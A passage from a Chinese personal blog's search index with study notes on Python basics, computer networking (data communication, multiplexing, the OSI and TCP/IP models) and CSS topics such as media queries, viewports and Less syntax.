class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 复制列表</span></span><br><span class="line">list4 = list3[:]<span class="comment"># server.py</span></span><br><span class="line"><span class="comment"># 从wsgiref模块导入:</span></span><br><span class="line"><span class="keyword">from</span> wsgiref.simple_server <span class="keyword">import</span> make_server</span><br><span class="line"><span class="comment"># 导入我们自己编写的application函数:</span></span><br><span class="line"><span class="keyword">from</span> hello <span class="keyword">import</span> application</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个服务器，IP地址为空，端口是8000，处理函数是application:</span></span><br><span class="line">httpd = make_server(<span class="string">&#x27;&#x27;</span>, <span class="number">8000</span>, application)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Serving HTTP on port 8000...&#x27;</span>)</span><br><span class="line"><span class="comment"># 开始监听HTTP请求:</span></span><br><span class="line">httpd.serve_forever()</span><br><span class="line"><span class="comment"># 复制引用(地址)</span></span><br><span class="line">list5 = list3</span><br></pre></td></tr></table></figure><h3 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列表的合并</span></span><br><span class="line">list2.extend(list3)</span><br><span class="line">list2 += list3</span><br></pre></td></tr></table></figure><h2 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h2><p>不可修改的列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l = ( <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> )</span><br><span class="line"><span class="comment"># error</span></span><br><span class="line">l.append(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><h2 id="条件分支"><a href="#条件分支" class="headerlink" title="条件分支"></a>条件分支</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">14</span></span><br><span class="line"><span class="keyword">if</span> n&gt;<span class="number">10</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;执行语句1&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> n&lt;<span class="number">20</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;执行语句2&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;执行语句3&quot;</span>)</span><br><span class="line"><span class="comment"># 布尔值</span></span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">b = <span class="number">3</span></span><br><span class="line">res1 = a &gt; b</span><br><span class="line">res2 = a == b</span><br><span class="line"><span class="built_in">print</span>(res1)</span><br><span class="line"><span class="built_in">print</span>(res2)</span><br><span class="line"><span class="comment"># 多个条件</span></span><br><span class="line">res = n &gt;= <span class="number">18</span> <span class="keyword">and</span> n &lt;= <span class="number">40</span></span><br><span class="line">res = n &lt;=<span class="number">3</span> <span class="keyword">or</span> n &gt;= <span class="number">50</span></span><br><span class="line"><span class="comment"># 判断是否在列表存在</span></span><br><span class="line">l = [ <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> ]</span><br><span class="line">res3 = <span class="number">1</span> <span class="keyword">in</span> l</span><br><span class="line">res4 = <span class="number">2</span> <span class="keyword">not</span> <span class="keyword">in</span> l</span><br><span class="line"><span class="built_in">print</span>(res3)</span><br><span class="line"><span class="built_in">print</span>(res4)</span><br></pre></td></tr></table></figure><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">10</span>:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 中途退出循环</span></span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">20</span>:</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 或者break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>物理层-数据通信</title>
      <link href="/Networking/NOTE/%E7%89%A9%E7%90%86%E5%B1%82-%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1.html"/>
      <url>/Networking/NOTE/%E7%89%A9%E7%90%86%E5%B1%82-%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考<a href="https://www.icourse163.org/learn/NJUPT-1001639008?tid=1450250444#/learn/announce">南京邮电大学的网络技术与应用课</a>与Andrew S. Tanenbaum与David J. Wetherall的计算机网络（第五版）</p></blockquote><span id="more"></span><h2 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1.基本概念"></a>1.基本概念</h2><h3 id="1-1信号、数据和信号"><a href="#1-1信号、数据和信号" class="headerlink" title="1.1信号、数据和信号"></a>1.1信号、数据和信号</h3><p>数据通信的目的就是交换信息，而数据就是信息的载体，数据又分为模拟数据（连续）和数字数据（离散，如01），它两个之间可以互相转换；信号就是数据在传输过程中的电磁波编码，同样分为模拟信号（连续的电磁波）和数字信号（电压脉冲）</p><h3 id="1-2数据通信系统"><a href="#1-2数据通信系统" class="headerlink" title="1.2数据通信系统"></a>1.2数据通信系统</h3><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/communication-system.png" alt=""></p><h3 id="1-3技术指标"><a href="#1-3技术指标" class="headerlink" title="1.3技术指标"></a>1.3技术指标</h3><h4 id="1-3-1传输速率"><a href="#1-3-1传输速率" class="headerlink" title="1.3.1传输速率"></a>1.3.1传输速率</h4><p><strong>传码速率</strong></p><p>又称为调制速率、波特率，指每秒传输信号码元的个数，记作$N_{Bd}$，单位波特（Baud）</p><p>携带数据信息的信号脉冲就叫信号码元，一个信号脉冲可以代表多个0，1的组合</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/%E4%BA%8C%E7%94%B5%E5%B9%B3.png" alt="二电平"></p><p>在上述二电平图中，信号码元的持续时间是$T$，所以传码速率是$\Large\frac{1}{T}$</p><p><strong>传信速率</strong></p><p>又叫比特率，记作$R_b$，单位bit/s、kbit/s…</p><p><strong>两者关系</strong><br>$$<br>R_b=N_{Bd}\times\log_2 M(M表示电平)<br>$$</p><p>在二电平中（一次脉冲传输1bit），波特率和比特率数值相等</p><h4 id="1-3-2信号带宽"><a href="#1-3-2信号带宽" class="headerlink" title="1.3.2信号带宽"></a>1.3.2信号带宽</h4><p>带宽（bandwidth）本来是指某个信号的频带宽度（范围），单位Hz、KHz、MHz（频率域）</p><p>在传输数据时，把带宽作为数字信道的数据传输速率，此时单位就是bit/s、Kbit/s（时间域）</p><p>两者本质一样</p><h4 id="1-3-3误码率和误组率"><a href="#1-3-3误码率和误组率" class="headerlink" title="1.3.3误码率和误组率"></a>1.3.3误码率和误组率</h4><p><strong>误码率</strong></p><p>指在一定时间内接收到出错的bit数与传输的总bit数之比，是评定传输质量的一项指标</p><p>$$<br>P_e=\frac{e_1}{e_2}\times100%<br>$$</p><p><strong>误组率</strong></p><p>因为在数据块结构和帧结构的控制下，误码率不能不能确切知道它的差错造成的影响，一般用误组率表示通信质量<br>$$<br>P_b=\frac{b_1}{b_2}\times100%<br>$$</p><h4 id="1-3-4时延"><a href="#1-3-4时延" class="headerlink" title="1.3.4时延"></a>1.3.4时延</h4><p>delay指一个分组从一条链路的一端到另一端需要的时间，这个时间由几个不同的部分组成</p><p>(1)<strong>发送时延</strong></p><p>节点发送数据到传输媒体（网卡，路由）使用的时间，计算公式<br>$$<br>发送时延=\frac{数据长度bit}{信道带宽b/s}<br>$$<br>信道带宽又叫发送速率，传输速率</p><p>(2)<strong>传播时延</strong></p><p>指的是电磁波在信道中传播一定的距离所发送的时间，也就是路由器到路由器时间，公式<br>$$<br>传播时延=\frac{信道长度m}{传播速度m/s}<br>$$<br>(3)<strong>处理时延</strong></p><p>指数据在交换节点储存-转发的时间，在节点的缓存队列中排队所经历的时间是处理时延的主要部分<br>$$<br>总时延=发送时延+传播时延+处理时延<br>$$</p><blockquote><p>一般只考虑前面两种时延，大文件主要考虑发送时延，小文件考虑传播时延</p></blockquote><h4 id="1-3-5信道容量"><a href="#1-3-5信道容量" class="headerlink" title="1.3.5信道容量"></a>1.3.5信道容量</h4><p>指在一定条件下（误码，带宽，噪声），在通信路径(信道)所能达到大数据传输速率</p><p>分有无噪声的情况分析</p><ul><li>奈奎斯特准则：在理想条件下，带宽为$W$Hz的信道，传码速率最高为2$W$波特<ul><li>公式：$C=2Wlog_2 M$</li></ul></li><li>香农定理：在有噪声的环境中，信道容量与信噪功率比($S/N$)有关<ul><li>公式1：$C=2W\log_2\small{(1+S/N)}$</li><li>公式2：$dB=10log_{10}\small({信号功率P_S/噪声功率P_N})$</li><li>它告诉我们在信道容量不变时可以增加带宽就可以降低信噪比</li></ul></li></ul><h3 id="1-4传输介质"><a href="#1-4传输介质" class="headerlink" title="1.4传输介质"></a>1.4传输介质</h3><p>有线的传输介质有双绞线、同轴线缆、光纤等</p><p>无线的传输介质有无线电波、地面微波、卫星微波、红外线等</p><h2 id="2-多路复用技术"><a href="#2-多路复用技术" class="headerlink" title="2.多路复用技术"></a>2.多路复用技术</h2><p>指在一条通信线路中传输多路信号，提高传输媒介利用率</p><h3 id="2-1频分复用"><a href="#2-1频分复用" class="headerlink" title="2.1频分复用"></a>2.1频分复用</h3><p>FDM（Frequency Division Multiplexing）利用的是通信线路的可用带宽超过需要的带宽（这里指Hz），则可以将信号以不同的载波频率进行调制（不能重叠），使每个信号都有一个独立的信道传输</p><p>也就是说在相同时间内占用不同的频率带宽</p><h3 id="2-2时分复用"><a href="#2-2时分复用" class="headerlink" title="2.2时分复用"></a>2.2时分复用</h3><p>TDM（Time Division Multiplexing）是一种固定分配资源的方式，将传输时间分成多个片段，每个用户分得一个片段，一组时间片叫作帧</p><p>在不同时间内占用相同的频率带宽</p><blockquote><p>上面两种技术的用户会一直占用信道资源，因此对信道利用率都不高</p></blockquote><h3 id="2-3统计时分复用"><a href="#2-3统计时分复用" class="headerlink" title="2.3统计时分复用"></a>2.3统计时分复用</h3><p>STDM（Statistical Time Division Multiplexing）与时分复用相同的是信道是按时间片分配的，不同的是时间片是动态分配的，每个用户的数据传输速率最高可以达到该线路总的传输能力</p><h3 id="2-4波分复用"><a href="#2-4波分复用" class="headerlink" title="2.4波分复用"></a>2.4波分复用</h3><p>WDM（Wavelength Division Multiplexing）与FDM类似，指的是在一条光纤内传输多路不同波长的光信号</p><h3 id="2-5码分复用"><a href="#2-5码分复用" class="headerlink" title="2.5码分复用"></a>2.5码分复用</h3><p>CDM（Coding Division Multiplexing）指的是每个用户有一个单独的码片序列（所有码片必须正交）</p><ul><li>当发送1时，就发送原序列</li><li>发送0时，发送补码序列</li><li>什么都不做时就是0</li></ul><p>将所有信号相加得到发送信号，接收端使用某个用户的码片序列和接收到的信号即可得到这个用户发送的信息</p><p>例如</p><table><thead><tr><th>用户</th><th>码片序列</th><th>发送信号</th></tr></thead><tbody><tr><td>A</td><td>( 0 1 0 1 )，发送1</td><td>(-1 +1 -1 +1)</td></tr><tr><td>B</td><td>( 0 0 1 1 )，发送0</td><td>(+1 +1 -1 -1)</td></tr><tr><td>C</td><td>( 0 0 0 0 )，发送1</td><td>(-1 -1 -1 -1)</td></tr></tbody></table><p>将上面的序列相加得到发送信号(-1 +1 -3 -1)</p><table><thead><tr><th align="left">用户</th><th align="left">计算</th><th align="left">数据</th></tr></thead><tbody><tr><td align="left">A</td><td align="left">$\frac{1}{4}\times(-1 +1 -3 -1)\times(-1 +1 -1 +1)=+1$</td><td align="left">1</td></tr><tr><td align="left">B</td><td align="left">$\frac{1}{4}\times(-1 +1 -3 -1)\times(-1 -1 +1 +1)=-1$</td><td align="left">0</td></tr><tr><td align="left">C</td><td align="left">$\frac{1}{4}\times(-1 +1 -3 -1)\times(-1 -1 -1 -1)=+1$</td><td align="left">1</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> NOTE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 带宽 </tag>
            
            <tag> 时延 </tag>
            
            <tag> 多路复用 </tag>
            
            <tag> 数据传输 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络参考模型</title>
      <link href="/Networking/NOTE/%E7%BD%91%E7%BB%9C%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B.html"/>
      <url>/Networking/NOTE/%E7%BD%91%E7%BB%9C%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-OSI"><a href="#1-OSI" class="headerlink" title="1.OSI"></a>1.OSI</h2><p>OSI（Open Systems Interconnection）开放系统互连，是ISO提出的参考模型</p><span id="more"></span><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/ISO.png" alt="ISO"></p><p><strong>物理层（physical layer）</strong></p><p>传输的单位是bit，主要涉及机械，电子和时序接口，还有以下的物理介质</p><p><strong>数据链路层（data link）</strong></p><p>将输入的数据拆分成数据帧（data frame），顺序发送</p><p><strong>网络层（network）</strong></p><p>控制着子网的运行，传输单位是数据包，也叫分组</p><p><strong>传输层（transport）</strong></p><p>接收上一层的数据，在必要时分割数据传递给网络层，还确保了数据正确达到另一端</p><p>传输层是真正端到端的层，它自始自终将数据从源携带给接收方，而它下面的层，都被多个路由隔开了</p><p>1-3层是链式连接的，4-7层是端到端的</p><p><strong>会话层（session）</strong></p><p>允许不同机器上的用户建立会话，提供了对话控制、令牌管理和同步等功能</p><p><strong>表示层（presentation）</strong></p><p>关注语法和语义，使计算机能进行通信</p><p><strong>应用层（application）</strong></p><p>数据从网络相关的程序以这种应用内部使用的格式进行传送，然后编码成标准协议的格式。</p><p>包含了用户需要的各种协议，比如HTTP，FTP，SMTP</p><h2 id="2-TCP-IP"><a href="#2-TCP-IP" class="headerlink" title="2.TCP/IP"></a>2.TCP/IP</h2><p>TCP/IP代表的不仅仅是TCP（transport control protocol）和IP（Internet Protocol），只是因为这两个协议最主要才这样命名的</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/TCPIP.png" alt="TCPIP"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> NOTE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSI </tag>
            
            <tag> TCP/IP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>响应式布局</title>
      <link href="/Front-end/CSS/7.%E5%93%8D%E5%BA%94%E5%BC%8F%E5%B8%83%E5%B1%80.html"/>
      <url>/Front-end/CSS/7.%E5%93%8D%E5%BA%94%E5%BC%8F%E5%B8%83%E5%B1%80.html</url>
      
        <content type="html"><![CDATA[<ul><li>网页可以根据不同的设备或窗口大小呈现不同的效果</li><li>使用响应式布局，可以使一个网页适用所有设备</li></ul><span id="more"></span><h3 id="媒体查询"><a href="#媒体查询" class="headerlink" title="媒体查询"></a>媒体查询</h3><ul><li>响应式布局的关键就是媒体查询</li><li>可以为不同的设备，不同状态分别设置样式</li></ul><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p><code>@media 查询规则&#123;&#125;</code></p><ul><li>媒体类型<ul><li>all 所有设备</li><li>print 打印设备</li><li>screen 屏幕阅读器</li><li>speech 屏幕阅读器</li><li>为了兼容老浏览器，媒体类型前面要加only</li></ul></li><li>媒体特性<ul><li>width 视口宽度</li><li>heigh 视口高度</li><li>min-width 最小宽度（大于时生效）</li><li>max-height 最大高度 </li></ul></li></ul><p>例子</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">min-width</span>: <span class="number">500px</span>) <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">700px</span>)&#123;</span><br><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line"><span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 响应式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络基础</title>
      <link href="/Networking/NOTE/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80.html"/>
      <url>/Networking/NOTE/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-网络硬件"><a href="#1-网络硬件" class="headerlink" title="1.网络硬件"></a>1.网络硬件</h2><h3 id="1-1传输技术"><a href="#1-1传输技术" class="headerlink" title="1.1传输技术"></a>1.1传输技术</h3><h4 id="点到点"><a href="#点到点" class="headerlink" title="点到点"></a>点到点</h4><p>点到点（point to point）链路是将一对单独的机器连接起来。点到点传输只有一个接收方和一个发送方，也叫单播（unicasting）</p><span id="more"></span><h4 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h4><p>在广播网络上，通信信道被所有机器共享，每一台机器发送数据包，其他机器都能收到，然后根据数据包内的地址判断是否接收。</p><p>广播也能将一个数据包发给所有目标机器，这种传输模式就叫广播（broadcasting），给一组机器传输数据包时就叫组播（multicating）</p><h3 id="1-2网络尺度"><a href="#1-2网络尺度" class="headerlink" title="1.2网络尺度"></a>1.2网络尺度</h3><h4 id="PAN"><a href="#PAN" class="headerlink" title="PAN"></a>PAN</h4><p>个域网（Personal Area Network）指的是设备围绕一个人通信，比如键盘，鼠标，蓝牙耳机…</p><h4 id="LAN"><a href="#LAN" class="headerlink" title="LAN"></a>LAN</h4><p>局域网（Local Area Network）是一种私有网络，存在于家庭，公司，工厂。</p><p>一般都是每台计算机与另一个设备通信，这个设备被称为接入点（AP，Access Point）、无线路由器（wireless router）或者基站（base station），他们负责处理数据包</p><h4 id="MAN"><a href="#MAN" class="headerlink" title="MAN"></a>MAN</h4><p>城域网（Metropolitan Area Network）的范围覆盖一个城市，比如有线电视网</p><h4 id="WAN"><a href="#WAN" class="headerlink" title="WAN"></a>WAN</h4><p>广域网（Wide Area Network）通常跨越一个国家、地区或者一个大陆</p><h4 id="互联网"><a href="#互联网" class="headerlink" title="互联网"></a>互联网</h4><p>为了让不同的硬件和软件连接起来，于是就有了互联网（internet）</p><h2 id="2-网络软件"><a href="#2-网络软件" class="headerlink" title="2.网络软件"></a>2.网络软件</h2><h3 id="2-1协议层次结构"><a href="#2-1协议层次结构" class="headerlink" title="2.1协议层次结构"></a>2.1协议层次结构</h3><p>类似于编程的抽象接口，封装思想，向用户提供服务时，将内部算法细节隐藏起来</p><p>为了简化网络设计的复杂性，将网络进行了分层，每层的功能、内容都不相同，每层都向上一层提供特定的服务</p><p>每个机器的第n层与其他机器的第n层进行交流都会使用相同的规则，这个规则就叫<strong>协议（protocol）</strong>，最下层都是物理介质</p><p>层与层之间存在<strong>接口（interface）</strong>，定义上层可以使用下层的哪些服务</p><p>层与协议的集合被称为<strong>网络体系结构（network architectrue）</strong>，编写程序和设计硬件都必须遵循相关的协议，体系结构不包括协议的具体实现和接口规范</p><p>每层的协议组合起来就是<strong>协议栈（protocol stack）</strong>，原始信息在层与层之间传递时，每层都会把信息包装，到另一个机器时才会一步一步解开包装得到信息</p><h3 id="2-2面向连接和无连接"><a href="#2-2面向连接和无连接" class="headerlink" title="2.2面向连接和无连接"></a>2.2面向连接和无连接</h3><p>面向连接的服务（connection-oriented service）类似电话，服务用户需要建立一个连接（打电话），传输数据（说话），断开连接（挂）.</p><p>无连接服务（confectionless service）是按照邮政系统建模的，每个报文（信件）都有地址 ，然后发往目的地</p><p>六种不同类型的服务（前三个是面向连接）</p><table><thead><tr><th>服务</th><th>例子</th></tr></thead><tbody><tr><td>可靠的报文流</td><td>顺序页面</td></tr><tr><td>可靠的字节流</td><td>移动下载</td></tr><tr><td>不可靠的连接</td><td>IP语音</td></tr><tr><td>不可靠的数据报</td><td>垃圾邮件</td></tr><tr><td>有确认的数据报</td><td>文本消息</td></tr><tr><td>请求-应答</td><td>数据库查询</td></tr></tbody></table><h3 id="2-3服务原语"><a href="#2-3服务原语" class="headerlink" title="2.3服务原语"></a>2.3服务原语</h3><p>一个服务由一组原语（primitive）正式说明，原语规定了服务执行的动作</p><h3 id="2-4服务与协议的关系"><a href="#2-4服务与协议的关系" class="headerlink" title="2.4服务与协议的关系"></a>2.4服务与协议的关系</h3><p>服务是垂直的，它向上一层提供原语</p><p>协议是水平的，它是一组规则，规定了两个不同计算机交换数据包的格式和含义</p><p>服务就像抽象类，协议就像具体实现</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> NOTE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PAN </tag>
            
            <tag> LAN </tag>
            
            <tag> MAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS里面的像素</title>
      <link href="/Front-end/CSS/6.CSS%E9%87%8C%E9%9D%A2%E7%9A%84%E5%83%8F%E7%B4%A0.html"/>
      <url>/Front-end/CSS/6.CSS%E9%87%8C%E9%9D%A2%E7%9A%84%E5%83%8F%E7%B4%A0.html</url>
      
        <content type="html"><![CDATA[<p>像素又分为css像素和物理像素</p><span id="more"></span><h3 id="css像素"><a href="#css像素" class="headerlink" title="css像素"></a>css像素</h3><p>就是我们在编写网页时用的像素就是css像素</p><h3 id="物理像素"><a href="#物理像素" class="headerlink" title="物理像素"></a>物理像素</h3><p>比如我的电脑分辨率是1920×1200，这就是物理像素</p><blockquote><p>默认情况下，在pc端css与物理像素比是1:1</p></blockquote><h2 id="视口"><a href="#视口" class="headerlink" title="视口"></a>视口</h2><ul><li><code>viewport</code>就是屏幕中用来显示网页的区域</li><li>默认情况下1css px=1物理像素</li><li>放大两倍时，1css px= 2物理像素</li></ul><h3 id="手机视口宽度"><a href="#手机视口宽度" class="headerlink" title="手机视口宽度"></a>手机视口宽度</h3><p>移动的视口默认是980px（css像素）</p><ul><li>使pc端可以在移动端访问，完整显示网页</li><li>所以大部分的pc端可以在移动端正常浏览，但体验不好</li><li>所以需要为移动端设计一个网页</li></ul><p>所以编写移动端网页时，需要一个设置合理的像素比</p><ul><li>通过meta设置视口大小</li><li>最佳的视口大小称为完美视口，由厂商给出</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="vw"><a href="#vw" class="headerlink" title="vw"></a>vw</h3><p>%是相对于父元素或其他作为参考的</p><p>vw是永远相对于视口作为参考的</p><ul><li><p>100vw=视口宽度</p></li><li><p>1vw=1%的视口宽度</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 像素 </tag>
            
            <tag> 视口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单使用less</title>
      <link href="/Front-end/CSS/5.%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8less.html"/>
      <url>/Front-end/CSS/5.%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8less.html</url>
      
        <content type="html"><![CDATA[<p>为了简化代码而采用的，CSS自带不兼容老浏览器，于是有了less</p><span id="more"></span><h3 id="CSS变量和函数"><a href="#CSS变量和函数" class="headerlink" title="CSS变量和函数"></a>CSS变量和函数</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* define */</span></span><br><span class="line"><span class="selector-tag">html</span>&#123;</span><br><span class="line">--varName:<span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 使用 */</span></span><br><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">wdith:<span class="built_in">var</span>(--varName);</span><br><span class="line">    <span class="comment">/* calc()函数负责计算*/</span></span><br><span class="line">    <span class="attribute">height</span>:<span class="built_in">calc</span>(<span class="number">500px</span>/<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="less"><a href="#less" class="headerlink" title="less"></a>less</h2><ul><li>less是css的增强版，写更少的代码实现更强大的样式</li><li>支持变量，mixins..</li><li>语法与css一致，但有许多扩展</li><li>浏览器无法直接执行less代码，需要转换工具将less to css</li><li>将代码模块化，方便<strong>维护与管理</strong></li></ul><h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><p>less源码（只是介绍一些基本的语法）</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//变量声明</span></span><br><span class="line"><span class="variable">@a:</span><span class="number">100px</span>;</span><br><span class="line"><span class="variable">@a:</span> <span class="number">200px</span>;</span><br><span class="line"><span class="variable">@b:</span> img;</span><br><span class="line"><span class="variable">@c:</span> test;</span><br><span class="line"><span class="comment">//less行注释</span></span><br><span class="line"><span class="comment">/* less，css块注释，会编译到css文件内 */</span></span><br><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="comment">/* 变量直接使用 */</span></span><br><span class="line">    <span class="attribute">width</span>: <span class="variable">@a</span>;</span><br><span class="line">    <span class="comment">/* 引用其他属性 */</span></span><br><span class="line">    <span class="attribute">height</span>: $width;</span><br><span class="line">    <span class="comment">/* 变量作为部分值的使用 */</span></span><br><span class="line">    <span class="attribute">background-image</span>: url(<span class="string">&quot;@&#123;b&#125;/1.png&quot;</span>);</span><br><span class="line">    <span class="comment">/* div里的元素样式 */</span></span><br><span class="line">    <span class="selector-tag">span</span>&#123;</span><br><span class="line">        <span class="attribute">color</span>: red;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* &amp;代表外层的父元素 */</span></span><br><span class="line">    <span class="selector-tag">&amp;</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">        <span class="attribute">color</span>: blue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 变量作为类名的使用 */</span></span><br><span class="line"><span class="selector-class">.@&#123;c&#125;</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="variable">@a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 